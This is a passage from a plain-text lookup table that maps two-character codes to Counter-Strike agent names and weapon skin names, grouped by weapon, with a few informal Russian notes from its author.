Nationale\nZz | Master Agent | Cmdr. Davida 'Goggles' Fernandez | SEAL Frogman\nZy | Master Agent | Cmdr. Frank 'Wet Sox' Baroud | SEAL Frogman\nX9 | Master Agent | Cmdr. Mae 'Dead Cold' Jamison | SWAT\nZ0 | Master Agent | Crasswater The Forgotten | Guerrilla Warfare\nX7 | Master Agent | Lt. Commander Ricksaw | NSWC SEAL\nX6 | Master Agent | Sir Bloody Darryl Royale | The Professionals\nX4 | Master Agent | Sir Bloody Loudmouth Darryl | The Professionals\nX3 | Master Agent | Sir Bloody Miami Darryl | The Professionals\nYA | Master Agent | Sir Bloody Silent Darryl | The Professionals\nX8 | Master Agent | Sir Bloody Skullhead Darryl | The Professionals\nX5 | Master Agent | Special Agent Ava | FBI\nYC | Master Agent | The Elite Mr. Muhlik | Elite Crew\nZw | Master Agent | Vypa Sista of the Revolution | Guerrilla Warfare\nYK | Superior Agent | 'Two Times' McCoy | TACP Cavalry\nYI | Superior Agent | 'Two Times' McCoy | USAF TACP\nYF | Superior Agent | 1st Lieutenant Farlow | SWAT\nZ5 | Superior Agent | Arno The Overgrown | Guerrilla Warfare\nYG | Superior Agent | Blackwolf | Sabre\nZ3 | Superior Agent | Bloody Darryl The Strapped | The Professionals\nZ1 | Superior Agent | Chem-Haz Capitaine | Gendarmerie Nationale\nZ2 | Superior Agent | Elite Trapper Solman | Guerrilla Warfare\nZ4 | Superior Agent | Lieutenant Rex Krikey | SEAL Frogman\nYJ | Superior Agent | Michael Syfers | FBI Sniper\nYD | Superior Agent | Number K | The Professionals\nYM | Superior Agent | Prof. Shahmat | Elite Crew\nYH | Superior Agent | Rezan The Ready | Sabre\nYL | Superior Agent | Rezan the Redshirt | Sabre\nYE | Superior Agent | Safecracker Voltzmann | The Professionals\n===================\nM4A4:\nTo | M4A4 | Cyber Security\nXg | M4A4 | In Living Color\nY9 | M4A4 | Spider Lily\nai | M4A4 | The Coalition\nS2 | M4A4 | Tooth Fairy\nEf | M4A4 Asiimov\nEs | M4A4 Bullet Rain\nBA | M4A4 Buzz Kill\nQu | M4A4 Converter\nED | M4A4 Desert-Strike\nBj | M4A4 Desolate Space\nDa | M4A4 Dragon King\nNy | M4A4 Emperor\nDA | M4A4 Evil Daimyo\nby | M4A4 Eye of Horus\nFT | M4A4 Faded Zebra\nDs | M4A4 Griffin\nAd | M4A4 Hellfire\nAA | M4A4 Howl\nNr | M4A4 Magnesium\nLx | M4A4 Neo-Noir\nbH | M4A4 Poly Mag\nAE | M4A4 Poseidon\nHU | M4A4 Radiation Hazard\nCW | M4A4 Royal Paladin\nbO | M4A4 Temukau\nCG | M4A4 The Battlestar\nAZ | M4A4 Tornado\nE9 | M4A4 X-Ray\nFb | M4A4 Zirka\ncM | M4A4 | Etch Lord\nc6 | M4A4 | Polysoup \ncs | M4A4 | Turbine \n===================\nAWP:\na7 | AWP | Chromatic Aberration\nZq | AWP | Desert Hydra\nTr | AWP | Exoskeleton\nUR | AWP | Fade\naH | AWP | POP AWP\nUX | AWP | Silk Tiger\nQt | AWP Acheron\nES | AWP Asiimov\nN3 | AWP Atheris\nb4 | AWP Black Nile\nFM | AWP BOOM\nQj | AWP Capillary\nPQ | AWP Containment Breach\nEv | AWP Corticera\nGG | AWP Dragon Lore\nbx | AWP Duality\nFB | AWP Electric Hive\nCH | AWP Elite Build\nAv | AWP Fever Dream\nFW | AWP Graphite\nQW | AWP Gungnir\nC2 | AWP Hyper Beast\nF7 | AWP Lightning Strike\nDY | AWP Man-o' -war\nAB | AWP Medusa\nLz | AWP Mortis\nNh | AWP Neo-Noir\nAc | AWP Oni Taiji\nMj | AWP PAW\nBm | AWP Phobos\nGW | AWP Pink DDPAT\nEj | AWP Redline\nAX | AWP Sun in Leo\nPh | AWP The Prince\nOx | AWP Wildfire\nDQ | AWP Worm God\ncH | AWP | Chrome Cannon\nc2 | AWP | CMYX \ndK | AWP | Crakow! \n===================\nAUG:\nad | AUG | Flame Jörmungandr\nZG | AUG | Plague\naO | AUG | Sand Storm\nAC | AUG Akihabara Accept\nMu | AUG Amber Slipstream\nPW | AUG Arctic Wolf\nBn | AUG Aristocrat\nEx | AUG Bengal Tiger\nET | AUG Chameleon\nG8 | AUG Colony\nO0 | AUG Death by Puppy\nB0 | AUG Fleet Flock\nAQ | AUG Hot Rod\nN1 | AUG Momentum\nGr | AUG Radiation Hazard\nCh | AUG Ricochet\ncG | AUG Snake Pit\nL1 | AUG Stymphalian\nBS | AUG Syd Mead\nQl | AUG Tom Cat\nEJ | AUG Torque\nLr | AUG Triqua\nGD | AUG Wings\nc0 | AUG | Luxe Trim \nc4 | AUG | Lil' Pig \ndN | AUG | Eye of Zapems \n===================\nM4A1-S:\nUS | M4A1-S | Blue Phosphor\naG | M4A1-S | Fizzy POP\nZp | M4A1-S | Imminent Danger\nau | M4A1-S | Night Terror\nTm | M4A1-S | Printstream\nUV | M4A1-S | Welcome to the Jungle\nEG | M4A1-S Atomic Alloy\nDr | M4A1-S Basilisk\nF2 | M4A1-S Blood Tiger\nAm | M4A1-S Briefing\nFc | M4A1-S Bright Water\nBz | M4A1-S Chantico's Fire\nOp | M4A1-S Control Panel\nDz | M4A1-S Cyrex\nGC | M4A1-S Dark Water\nAu | M4A1-S Decimator\nbS | M4A1-S Emphorosaur-S\nBG | M4A1-S Flashback\nCm | M4A1-S Golden Coil\nEh | M4A1-S Guardian\nAD | M4A1-S Hot Rod\nDJ | M4A1-S Hyper Beast\nAK | M4A1-S Icarus Fell\nGH | M4A1-S Knight\nLh | M4A1-S Leaded Glass\nGV | M4A1-S Master Piece\nBi | M4A1-S Mecha Industries\nb8 | M4A1-S Mud-Spec\nMg | M4A1-S Nightmare\nAN | M4A1-S Nitro\nQZ | M4A1-S Player Two\nHG | M4A1-S VariCamo\ncJ | M4A1-S | Black Lotus\nck | M4A1-S | Vaporwave \ndY | M4A1-S | Fade \ndV | M4A1-S | Wash me plz \n===================\nAK-47:\nWh | AK-47 | Case Hardened (Blue Gem)\nWi | AK-47 | Case Hardened (Gold Gem)\nZu | AK-47 | Gold Arabesque\na8 | AK-47 | Ice Coaled\nSw | AK-47 | Jungle Spray\nY4 | AK-47 | Leet Museo\nS1 | AK-47 | Legion of Anubis\naq | AK-47 | Nightwish\nUU | AK-47 | Panthera onca\nXl | AK-47 | Slate\nUW | AK-47 | X-Ray\nC3 | AK-47 Aquamarine Revenge\nNi | AK-47 Aziimov\nAV | AK-47 Black Laminate\nAs | AK-47 Bloodsport\nFD | AK-47 Blue Laminate\nF8 | AK-47 Case Hardened\nDW | AK-47 Elite Build\nFU | AK-47 Fire Serpent\nCo | AK-47 Frontside Misty\nCF | AK-47 Fuel Injector\nbN | AK-47 Head Shot\nAF | AK-47 Hydroponic\nEt | AK-47 Jaguar\nAG | AK-47 Jet Set\nBQ | AK-47 Neon Revolution\nMe | AK-47 Neon Rider\nAg | AK-47 Orbit Mk01\nQb | AK-47 Phantom Disruptor\nCX | AK-47 Point Disarray\nPV | AK-47 Rat Rod\nFN | AK-47 Red Laminate\nEU | AK-47 Redline\nHI | AK-47 Safari Mesh\nQr | AK-47 Safety Net\nb5 | AK-47 Steel Delta\nLf | AK-47 The Empress\nN8 | AK-47 Uncharted\nEE | AK-47 Vulcan\nDl | AK-47 Wasteland Rebel\nQX | AK-47 Wild Lotus\nDb | AK-47 Cartel\ncI | AK-47 | Inheritance\nco | AK-47 | The Outsiders \ndn | AK-47 | Olyve Polycam \ndI | AK-47 | B the Monster \ndB | AK-47 | Crossfade \n===================\nUSP-S:\nAH | USP-S  Orion\nZE | USP-S | Black Lotus\nSp | USP-S | Business Class\nTp | USP-S | Monster Mashup\na6 | USP-S | Printstream\nUT | USP-S | Target Acquired\nXh | USP-S | The Traitor\nav | USP-S | Ticket to Hell\nag | USP-S | Whiteout\nE6 | USP-S Blood Tiger\nAl | USP-S Blueprint\nEF | USP-S Caiman\nL0 | USP-S Cortex\nBI | USP-S Cyrex\nGB | USP-S Dark Water\nb9 | USP-S Desert Tactical\nNn | USP-S Flashback\nEa | USP-S Guardian\nCn | USP-S Kill Confirmed\nCU | USP-S Lead Conduit\nAt | USP-S Neo-Noir\nFZ | USP-S Overgrowth\nGX | USP-S Road Rash\nGM | USP-S Royal Blue\nFw | USP-S Serum\nFt | USP-S Stainless\nDC | USP-S Torque\ncL | USP-S | Jawbreaker\ncu | USP-S | 027 \nde | USP-S | Alphine Camo \n===================\nP250:\nTC | P250 | Cassette\nTx | P250 | Contaminant\nXo | P250 | Cyber Shell\naQ | P250 | Digital Architect\naJ | P250 | Gunsmoke\nSr | P250 | Vino Primo\nao | P250 | Whiteout\nb0 | P250 Apep's Curse \nB1 | P250 Asiimov\nG6 | P250 Bone Mask\nDn | P250 Cartel\nGu | P250 Contamination\nAI | P250 Franklin\nF3 | P250 Hive\nO4 | P250 Inferno\nBu | P250 Iron Clad\nEi | P250 Mehndi\nDZ | P250 Muertos\nNo | P250 Nevermore\nHT | P250 Nuclear Threat\nba | P250 Re.built\nAj | P250 Red Rock\nA5 | P250 Ripple\nHN | P250 Sand Dune\nLg | P250 See Ya Later\nFP | P250 Splash\nFJ | P250 Steel Disruption\nD5 | P250 Supernova\nFl | P250 Undertow\nDT | P250 Valence\nOE | P250 Verdigris\nbA | P250 Visions\nCu | P250 Wingshot\ncn | P250 | Epicenter \ndg | P250 | Small Game \n===================\nG3SG1:\nT1 | G3SG1 | Digital Mesh\naw | G3SG1 | Dream Glade\nZK | G3SG1 | Keeping Tabs\nFI | G3SG1 Azure Zebra\nPd | G3SG1 Black Sand\nAJ | G3SG1 Chronos\nFd | G3SG1 Demeter\nHM | G3SG1 Desert Storm\nCp | G3SG1 Flux\nMn | G3SG1 High Seas\nLq | G3SG1 Hunter\nDv | G3SG1 Murky\nB9 | G3SG1 Orange Crash\nG9 | G3SG1 Safari Mesh\nNm | G3SG1 Scavenger\nBF | G3SG1 Stinger\nCZ | G3SG1 The Executioner\nBc | G3SG1 Ventilator\n===================\nGlock-18:\nXr | Glock-18 | Clear Polymer\nUY | Glock-18 | Franklin\nah | Glock-18 | Gamma Doppler\nTn | Glock-18 | Neo-Noir\nam | Glock-18 | Pink DDPAT\nY6 | Glock-18 | Snack Attack\nS3 | Glock-18 | Vogue\nFu | Glock-18 Blue Fissure\nQa | Glock-18 Bullet Queen\nDG | Glock-18 Bunsen Burner\nOu | Glock-18 Candy Apple\nDg | Glock-18 Catacombs\nGA | Glock-18 Dragon Tattoo\nAL | Glock-18 Fade\nDq | Glock-18 Grinder\nG4 | Glock-18 Groundwater\nBK | Glock-18 Ironwork\nL2 | Glock-18 Moonrise\nGd | Glock-18 Night\nLp | Glock-18 Off World\nNs | Glock-18 Oxide Blaze\nb1 | Glock-18 Ramese's Reach\nGn | Glock-18 Reactor\nCM | Glock-18 Royal Legion\nO7 | Glock-18 Sacrifice\nEz | Glock-18 Steel Disruption\nbU | Glock-18 Umbral Rabbit\nMo | Glock-18 Warhawk\nBh | Glock-18 Wasteland Rebel\nD3 | Glock-18 Water Elemental\nBW | Glock-18 Weasel\nbG | Glock-18 Winterized\nCx | Glock-18 Wraiths\ncN | Glock-18 | Block-18\ncl | Glock-18 | Gold Toof \ndQ | Glock-18 | Teal Graf \ndZ | Glock-18 | AXIA \n===================\nZeus x27:\ncK | Zeus x27 | Olympus\ndJ | Zeus x27 | Dragon Snore \n===================\nDesert Eagle:\nZr | Desert Eagle | Fennec Fox\nY5 | Desert Eagle | Ocean Drive\nS0 | Desert Eagle | Printstream\naK | Desert Eagle | Sputnik\nXm | Desert Eagle | Trigger Discipline\nAM | Desert Eagle Blaze\nQk | Desert Eagle Blue Ply\nDU | Desert Eagle Bronze Deco\nFA | Desert Eagle Cobalt Disruption\nMf | Desert Eagle Code Red\nD1 | Desert Eagle Conspiracy\nCi | Desert Eagle Corinthian\nEy | Desert Eagle Crimson Web\nBV | Desert Eagle Directive\nQq | Desert Eagle Emerald Jormungandr\nFV | Desert Eagle Golden Koi\nGI | Desert Eagle Hand Cannon\nFo | Desert Eagle Heirloom\nF9 | Desert Eagle Hypnotic\nCI | Desert Eagle Kumicho Dragon\nN4 | Desert Eagle Light Rail\nNj | Desert Eagle Mecha Industries\nAY | Desert Eagle Midnight Storm\nDf | Desert Eagle Naga\nA2 | Desert Eagle Oxide Blaze\nOr | Desert Eagle Sunset Storm\nGb | Desert Eagle Urban DDPAT\nc1 | Desert Eagle | Heart Threaded \nc3 | Desert Eagle | Starcade \ncz | Desert Eagle | Calligraffiti \ndX | Desert Eagle | Tilted \n===================\nMAC-10:\nS7 | MAC-10 | Allure\nXp | MAC-10 | Button Masher\nab | MAC-10 | Calf Skin\nZt | MAC-10 | Case Hardened\nSu | MAC-10 | Copper Borre\na2 | MAC-10 | Ensnared\nUa | MAC-10 | Gold Brick\nac | MAC-10 | Hot Snakes\naI | MAC-10 | Propaganda\nY8 | MAC-10 | Toybox\nAq | MAC-10 Aloha\nGy | MAC-10 Amber Fade\nBs | MAC-10 Carnivore\nPA | MAC-10 Classic Crate\nAO | MAC-10 Curse\nQc | MAC-10 Disco Tech\ncA | MAC-10 Echoing Sands\nAS | MAC-10 Fade\nFa | MAC-10 Graven\nEX | MAC-10 Heat\nGS | MAC-10 Indigo\nCR | MAC-10 Lapis Gator\nAy | MAC-10 Last Dive\nDc | MAC-10 Malachite\nbL | MAC-10 Monkeyflage\nDI | MAC-10 Neon Rider\nGp | MAC-10 Nuclear Garden\nLu | MAC-10 Oceanic\nHK | MAC-10 Palm\nNq | MAC-10 Pipe Down\nCy | MAC-10 Rangeen\nbW | MAC-10 Sakkaku\nPR | MAC-10 Stalker\nEI | MAC-10 Tatter\nE7 | MAC-10 Ultraviolet\nOB | MAC-10 Whitefish\ncR | MAC-10 | Light Box\ncr | MAC-10 | Saiba Oni \ndP | MAC-10 | Pipsqueak \n===================\nMP7:\nar | MP7 | Abyssal Apparition\nZH | MP7 | Guerrilla\nA7 | MP7 Akoben\nDV | MP7 Armor Core\nLy | MP7 Bloodsport\nBL | MP7 Cirrus\nOt | MP7 Fade\nGc | MP7 Gunsmoke\nCO | MP7 Impire\nOC | MP7 Mischief\nC5 | MP7 Nemesis\nPY | MP7 Neon Ply\nE0 | MP7 Ocean Foam\nG5 | MP7 Orange Peel\nMk | MP7 Powercore\nGF | MP7 Skulls\nCt | MP7 Special Delivery\ncE | MP7 Sunbaked\nD8 | MP7 Urban Hazard\nAP | MP7 Whiteout\ncQ | MP7 Just Smile\ndE | MP7 | Astrolabe \n===================\nUMP-45:\nUZ | UMP-45 | Crime Scene\nZs | UMP-45 | Fade\nTt | UMP-45 | Gold Bismuth\nXs | UMP-45 | Oscillator\nL3 | UMP-45 Arctic Wolf\nGz | UMP-45 Blaze\nFg | UMP-45 Bone Pile\nBf | UMP-45 Briefing\nEb | UMP-45 Corporal\nDy | UMP-45 Delusion\nLl | UMP-45 Exposure\nHW | UMP-45 Fallout Warning \nDN | UMP-45 Grand Prix\nGR | UMP-45 Indigo\nEB | UMP-45 Labyrinth\nAp | UMP-45 Metal Flowers\nAT | UMP-45 Minotaur's Labyrinth\nNl | UMP-45 Momentum\nN6 | UMP-45 Moonrise\nO2 | UMP-45 Plastique\nB2 | UMP-45 Primal Saber\nDD | UMP-45 Riot\nbJ | UMP-45 Roadblock\nA0 | UMP-45 Scaffold\nGg | UMP-45 Scorched\nbR | UMP-45 Wild Child\ncU | UMP-45 | Motorized\ncm | UMP-45 | Neo-Noir \ndb | UMP-45 | Crimson Foil \n===================\nMP9:\nGj | MP9 Storm\nXi | MP9 | Food Chain\nZB | MP9 | Mount Fuji\naM | MP9 | Music Box\nap | MP9 | Starlight Protector\nBT | MP9 Airlock\nCB | MP9 Bioleak\nMA | MP9 Black Sand\nOs | MP9 Bulldozer\nMr | MP9 Capillary\nGK | MP9 Dark Age\nDx | MP9 Dart\nDj | MP9 Deadly Poison\nbY | MP9 Featherweight\nLo | MP9 Goo\nG0 | MP9 Hot Rod\nOz | MP9 Hydra\nFy | MP9 Hypnotic\nNv | MP9 Modest Threat\nAU | MP9 Pandora's Box\nEm | MP9 Rose Iron\nC9 | MP9 Ruby Poison Dart\nHQ | MP9 SAnd Dashed\nBN | MP9 Sand Scale\nGq | MP9 Setting Sun\nQs | MP9 Stained Glass\nPi | MP9 Wild Lily беретты баланс\ndc | MP9 | Arctic Tri-Tone \n===================\nTec-9:\nS5 | Tec-9 | Brother\nCe | Tec-9 Avalanche\nN7 | Tec-9 Bamboozle\nF5 | Tec-9 Blue Titanium\nLs | Tec-9 Cracked Opal\nAn | Tec-9 Cut Out\nPU | Tec-9 Decimator\nPB | Tec-9 Flash Out\nNx | Tec-9 Fubar\nBU | Tec-9 Fuel Injector\nBw | Tec-9 Ice Cap\nEP | Tec-9 Isaac\nCT | Tec-9 Jambiya\nb7 | Tec-9 Mummy's Rot\nHS | Tec-9 Nuclear Threat\nB6 | Tec-9 Re-Entry\nbc | Tec-9 Rebel\nEd | Tec-9 Sandstorm\nMq | Tec-9 Snek-9 тут авп pow\nAW | Tec-9 Terrace\nFn | Tec-9 Titanium Bit\nGm | Tec-9 Toxic\nHL | Tec-9 VariCamo\ncT | Tec-9 | Slag\ndk | Tec-9 | Tiger Stencil \n===================\nFive-SeveN:\nZC | Five-SeveN | Boost Protocol\nTq | Five-SeveN | Fairy Tale\na1 | Five-SeveN | Scrawl\nNz | Five-SeveN Angry Mob\nO6 | Five-SeveN Buddy\nAa | Five-SeveN Candy Apple\nA3 | Five-SeveN Capillary\nF0 | Five-SeveN Case Hardened\nG7 | Five-SeveN Contractor\nFp | Five-SeveN Cooper Galaxy\nL9 | Five-SeveN Flame Test\nD2 | Five-SeveN Fowl Play\nGv | Five-SeveN Hot Shot\nAb | Five-SeveN Hyper Beast\nEp | Five-SeveN Kami\nDM | Five-SeveN Monkey Business\nFK | Five-SeveN Nightshade\nHJ | Five-SeveN Orange Peel\nCc | Five-SeveN Retrobution\nBb | Five-SeveN Scumbria\nCL | Five-SeveN Triumvirate\nDu | Five-SeveN Urban Hazard\nBr | Five-SeveN Violent Daimyo\ncO | Five-SeveN | Hybrid\ndd | Five-SeveN | Heat Treated \ndW | Five-SeveN | Mignight Paintover \n===================\nGalil AR:\nXk | Galil AR | Chromatic Aberration\nS6 | Galil AR | Connexion\naa | Galil AR | Phoenix Blacklight\nTz | Galil AR | Vandal\nN9 | Galil AR Akoben\nBM | Galil AR Black Sand\nFF | Galil AR Blue Titanium\nGk | Galil AR Cerberus\nDX | Galil AR Chatterbox\nAx | Galil AR Crimson Tsunami\nbM | Galil AR Destroyer\nDL | Galil AR Eco\nB4 | Galil AR Firefight\nHB | Galil AR Hunting Blind\nER | Galil AR Kami\nFO | Galil AR Orange DDPAT\nDH | Galil AR Rocket Pop\nEo | Galil AR Sandstorm\nFe | Galil AR Shattered\nNp | Galil AR Signal\nCr | Galil AR Stone Cold\nAe | Galil AR Sugar Rush\nda | Galil AR | Rainbow Spoon \ndR | Galil AR | Metallic Squeezer \ndG | Galil AR | NV \n===================\nDual Berettas:\nTu | Dual Berettas | Dezastre\nat | Dual Berettas | Melondrama\nZJ | Dual Berettas | Tread\naf | Dual Berettas | Twin Turbo\nPa | Dual Berettas Balance\nFh | Dual Berettas Black Limba\nGU | Dual Berettas Briar\nCQ | Dual Berettas Cartel\nAf | Dual Berettas Cobra Strike\nCv | Dual Berettas Dualing Dragons\nO9 | Dual Berettas Elite 1.6\nbC | Dual Berettas Flora Carnivora\nFz | Dual Berettas Hemoglobin\nEl | Dual Berettas Marina\nFs | Dual Berettas Panther\nBE | Dual Berettas Royal Consorts\nMs | Dual Berettas Shred\nDe | Dual Berettas Urban Shock\nB8 | Dual Berettas Ventilators\ncW | Dual Berettas Hideout\nct | Dual Berettas | Hydro Strike \ndM | Dual Berettas | Sweet Little Angels \n===================\nP2000:\nTF | P2000 | Gnarled\na5 | P2000 | Lifted Spirits\nQf | P2000 Acid Etched\nHD | P2000 Amber Fade\nGL | P2000 Chainmail\nEu | P2000 Corticera\nDm | P2000 Fire Elemental\nGe | P2000 Grassland\nC7 | P2000 Handgun\nCj | P2000 Imperial\nBl | P2000 Imperial Dragon\nEC | P2000 Ivory\nPX | P2000 Obsidian\nFX | P2000 Ocean Foam\nCC | P2000 Oceanic\nEO | P2000 Pulse\nFr | P2000 Red FragCam ХАЙ\nBP | P2000 Turf\nL8 | P2000 Urban Hazard\nbQ | P2000 Wicked Sick\nAh | P2000 Woodsman\ndD | P2000 | Coral Halftone \n===================\nSSG 08:\naP | SSG 08 | Death Strike\nTA | SSG 08 | Mainframe 001\nTs | SSG 08 | Parallax\nSx | SSG 08 | Sea Calico\nY7 | SSG 08 | Turbo Peek\nEA | SSG 08 Abyss\ncB | SSG 08 Azure Glyph\nCq | SSG 08 Big Iron\nFv | SSG 08 Blood in the Water\nPT | SSG 08 Bloodshot\nE8 | SSG 08 Dark Water\nAi | SSG 08 Death's Head\nGa | SSG 08 Detour\nA9 | SSG 08 Dragonfire\nQg | SSG 08 Fever Dream\nB5 | SSG 08 Ghost Crusader\nCS | SSG 08 Necropos\nEQ | SSG 08 Slashed\nG2 | SSG 08 Tropical Storm\ncS | SSG 08 | Dezastre\ncp | SSG 08 | Rapid Transit \ndf | SSG 08 | Zeno \ndC | SSG 08 | Halftone Whorl \n===================\nP90:\nae | P90 | Astral Jörmungandr\nT0 | P90 | Cocoa Rampage\nTB | P90 | Freight\nan | P90 | Glacier Mesh\nSq | P90 | Leather\naN | P90 | Verdant Growth\nD0 | P90 Asiimov\nFE | P90 Blind Spot\nBo | P90 Chopper\nFx | P90 Cold Blooded\nFL | P90 Death by Kitty\nAk | P90 Death Grip\nDE | P90 Elite Build\nFY | P90 Emerald Dragon\nHX | P90 Fallout Warning \nBe | P90 Grim\nEN | P90 Module\nbV | P90 Neoqueen\nO1 | P90 Nostalgia\nOA | P90 Off World\nHP | P90 Sand Spray\nb2 | P90 ScaraB Rush\nHA | P90 Scorched\nBC | P90 Shallow Grave\nCY | P90 Shapewood\nGQ | P90 Storm\nMp | P90 Traction\nEV | P90 Trigon\nbE | P90 Vent Rush\nE2 | P90 Virus\nc5 | P90 | Attack Vector \ncq | P90 | Rundy Rash \ndT | P90 | Wash me \n===================\nFAMAS:\naj | FAMAS | Meltdown\nas | FAMAS | Rapid Eye Movement\nZA | FAMAS | ZX Spectron\nFC | FAMAS Afterimage\nOy | FAMAS Commemoration\nOD | FAMAS Crypsis\nO8 | FAMAS Decommissioned\nDK | FAMAS Djinn\nFS | FAMAS Doomkitty\nMi | FAMAS Eye of Athena\nF4 | FAMAS Hexane\nAo | FAMAS Macabre\nBB | FAMAS Mecha Industries\nbI | FAMAS Meow 36\nDB | FAMAS Neural Net\nEk | FAMAS Pulse\nBR | FAMAS Roll Cage\nEZ | FAMAS Sergeant\nGl | FAMAS Styx\nCw | FAMAS Survivor Z\nCK | FAMAS Valence\nbz | FAMAS Waters of Nephtys\ndm | FAMAS | Half Sleeve \ndH | FAMAS | Halftone Wash \n===================\nMAG-7:\nZD | MAG-7 | BI83 Spectrum\na4 | MAG-7 | Foresight\nS9 | MAG-7 | Monster Call\nGx | MAG-7 Bulldozer\nQY | MAG-7 Cinquedea\nCz | MAG-7 Cobalt Core\nb6 | MAG-7 Copper Coated\nDw | MAG-7 Firestarter\nAr | MAG-7 Hard Water\nAR | MAG-7 Hazard\nDP | MAG-7 Heat\nEe | MAG-7 Heaven Guard\nbd | MAG-7 Insomnia\nHa | MAG-7 Irradiated Alert \nQd | MAG-7 Justice тут гунгнир должен быть\nFR | MAG-7 Memento\nBX | MAG-7 Petroglyph\nPC | MAG-7 Popdog\nCN | MAG-7 Praetorian\nGO | MAG-7 Silver\nBO | MAG-7 Sonar\nGi | MAG-7 Storm\nL4 | MAG-7 SWAG-7\ndl | MAG-7 | Wildwood \n===================\nCZ75-Auto:\nE5 | CZ75-Auto Hexane\nBa | CZ75-Auto Imprint\nDO | CZ75-Auto Pole Position\nBJ | CZ75-Auto Polymer\nB3 | CZ75-Auto Red Astor\nD7 | CZ75-Auto Tigris\nEM | CZ75-Auto Twist\nAw | CZ75-Auto Xiangliu\nC6 | CZ75-Auto Yellow Jacket\nXt | CZ75-Auto | Circaetus\nak | CZ75-Auto | Syndicate\nTy | CZ75-Auto | Vendetta\nGJ | CZ75-Auto Chalice\nFq | CZ75-Auto Crimson Web\nQp | CZ75-Auto Distressed\nMl | CZ75-Auto Eco\nOv | CZ75-Auto Emerald\nGY | CZ75-Auto Nitro\nLk | CZ75-Auto Tacticat\nFk | CZ75-Auto The Fuschia Is Now\nFm | CZ75-Auto Tread Plate\nFj | CZ75-Auto Victoria\nc7 | CZ75-Auto | Slalom \n===================\nXM1014:\nS4 | XM1014 | Entombed\nSt | XM1014 | Frost Borre\nSo | XM1014 | Red Leather\nZF | XM1014 | Watchdog\nXj | XM1014 | XOXO\nay | XM1014 | Zombie Offensive\nB7 | XM1014 Black Tie\nGo | XM1014 Bone Machine\nHV | XM1014 Fallout Warning\nEL | XM1014 Heaven Guard\ncF | XM1014 Hieroglyph\nN0 | XM1014 Incinegator\nMD | XM1014 Oxide Blaze\nDi | XM1014 Quicksilver\nE3 | XM1014 Red Python )))\nC1 | XM1014 Scumbria\nAz | XM1014 Seasons\nBg | XM1014 Slipstream\nCf | XM1014 Teclu Burner\nDp | XM1014 Tranquility\nGZ | XM1014 VariCamo Blue\nLn | XM1014 Ziggy\ncV | XM1014 | Irezumi\nc8 | XM1014 | Halftone Shift \ndL | XM1014 | Monster Melt \n===================\nM249:\nGh | M249 Contrast Spray\nT2 | M249 | Deep Relief\nXq | M249 | O.S.I.P.R\nO5 | M249 Aztec\nbF | M249 Downtown\nA1 | M249 Emerald Poison Dart\nEq | M249 Magma\nCs | M249 Nebula Crusader\nCA | M249 Spectre\ncD | M249 Submerged\nDh | M249 System Lock\nPc | M249 Warbird\ncy | M249 | Hypnosis \ndF | M249 | Spectrogram \n===================\nSCAR-20:\na0 | SCAR-20 | Poultrygeist\nPD | SCAR-20 Assault\nBk | SCAR-20 Bloodsport\nA4 | SCAR-20 Blueprint\nDo | SCAR-20 Cardiac\nF6 | SCAR-20 Crimson Web\nEH | SCAR-20 Cyrex\nQh | SCAR-20 Enforcer\nbZ | SCAR-20 Fragments\nC0 | SCAR-20 Green Marine\nDk | SCAR-20 Grotto\nLt | SCAR-20 Jungle Slipstream\nCl | SCAR-20 Outbreak\nBY | SCAR-20 Powercore\nHO | SCAR-20 Sand Mesh\nGT | SCAR-20 Storm\ncv | SCAR-20 | Trail Blazer \ndA | SCAR-20 | Wild Berry \n===================\nPP-Bizon:\nZI | PP-Bizon | Lumen\nTD | PP-Bizon | Runic\nax | PP-Bizon | Space Cat\nEK | PP-Bizon Antique\nE1 | PP-Bizon Blue Streak\nHF | PP-Bizon Brass\nGs | PP-Bizon Chemical Green\nEr | PP-Bizon Cobalt Halftone\nPZ | PP-Bizon Embargo\nCa | PP-Bizon Fuel Rod\nBv | PP-Bizon Harvester\nLj | PP-Bizon High Roller\nHY | PP-Bizon Irradiated Alert\nBy | PP-Bizon Judgement of Anubis\nA6 | PP-Bizon Jungle Slipstream\nMB | PP-Bizon Night Riot\nD6 | PP-Bizon Osiris\nCP | PP-Bizon Photic Zone\nFG | PP-Bizon Water Sigil\ndj | PP-Bizon | Cold Cell \n===================\nSawed-Off:\nSv | Sawed-Off | Copper\naz | Sawed-Off | Spirit Board\nQi | Sawed-Off Apocalypto\nNw | Sawed-Off Black Sand\nMh | Sawed-Off Devourer\nCD | Sawed-Off Fubar\nDt | Sawed-Off Highwayman\nHZ | Sawed-Off Irradiated Alert \na9 | Sawed-Off Kiss♥Love\nBp | Sawed-Off Limelight\nLv | Sawed-Off Morris\nFQ | Sawed-Off Orange DDPAT\nDR | Sawed-Off Origami\nGP | Sawed-Off Rust Coat\nGf | Sawed-Off Sage Spray\nDd | Sawed-Off Serenity\nHH | Sawed-Off Snake Camo\nEg | Sawed-Off The Kraken\nBD | Sawed-Off Wasteland Princess\nCk | Sawed-Off Yorick\nA8 | Sawed-Off Zander\ncP | Sawed-Off | Analog Input\n===================\nNova:\nTv | Nova | Clear Polymer\nXu | Nova | Windblown\nEW | Nova Antique\nEw | Nova Bloomstick\nBt | Nova Exo\nFH | Nova Ghost Camo\nBH | Nova Gila\nF1 | Nova Graphite\nGN | Nova Green Apple\nCJ | Nova Hyper Beast\nD4 | Nova Koi\nPe | Nova Plume\nHR | Nova Predator\nDF | Nova Ranger\nEn | Nova Rising Skull\nb3 | Nova Sobek's Bite\nFi | Nova Tempest\nMm | Nova Toy Soldier\nL5 | Nova Wild Six\nNt | Nova Wood Fired\ncX | Nova | Dark Sigil\ndh | Nova | Yorkshire \ndO | Nova | Wurst Holle \n===================\nSG 553:\nXw | SG 553 | Heavy Metal\nTG | SG 553 | Ol' Rusty\nSn | SG 553 | Traveler\nBx | SG 553 Aerial\nMC | SG 553 Aloha\nCE | SG 553 Atlas\nPS | SG 553 Colony IV\nbb | SG 553 Cyberforce\nC4 | SG 553 Cyrex\nHE | SG 553 Damascus Steel\nNu | SG 553 Danger Close\nQe | SG 553 Darkwing\nbD | SG 553 Dragon Tech\nGw | SG 553 Fallout Warning\nG3 | SG 553 Gator Mesh\nQV | SG 553 Integrale\nLm | SG 553 Phantom\nEY | SG 553 Pulse\nCd | SG 553 Tiger Moth\nBZ | SG 553 Triarch\nGE | SG 553 Ultraviolet\nFf | SG 553 Wave Spray\nc9 | SG 553 | Berry Gel Coat \n===================\nNegev:\nXn | Negev | dev_texture\nSs | Negev | Mjölnir\naR | Negev | Phoenix Stencil\nTE | Negev | Ultralight\nMd | Negev Anodized Navy\nE4 | Negev 